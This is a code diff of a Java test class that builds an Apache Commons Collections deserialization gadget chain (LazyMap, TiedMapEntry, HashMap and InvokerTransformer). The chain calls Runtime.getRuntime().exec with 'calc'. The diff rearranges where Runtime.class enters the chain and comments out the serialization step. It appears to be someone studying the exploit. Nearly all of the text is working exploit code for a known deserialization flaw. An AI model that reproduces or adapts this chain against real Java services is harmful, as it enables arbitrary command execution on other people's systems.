@@ -59,7 +59,6 @@ public class TestClass {
 
 
         Transformer[] transformers = new Transformer[]{
-                new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                 new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                 new InvokerTransformer("exec", new Class[] { String.class }, new String[] {"calc"}),
@@ -70,17 +69,18 @@ public class TestClass {
 
         Map decorate = LazyMap.decorate(map,new ConstantTransformer(1));
 
-        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, "aaa");
+
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, Runtime.class);
 
         HashMap kvHashMap = new HashMap<>();
         kvHashMap.put(tiedMapEntry,"bbb");
-        decorate.remove("aaa");
+        decorate.clear();
 
         Field clazz = Class.forName("org.apache.commons.collections.map.LazyMap").getDeclaredField("factory");
         clazz.setAccessible(true);
         clazz.set(decorate,chainedTransformer);
 
-        serialization(kvHashMap);
+//        serialization(kvHashMap);
         unserialization();
     }
 }
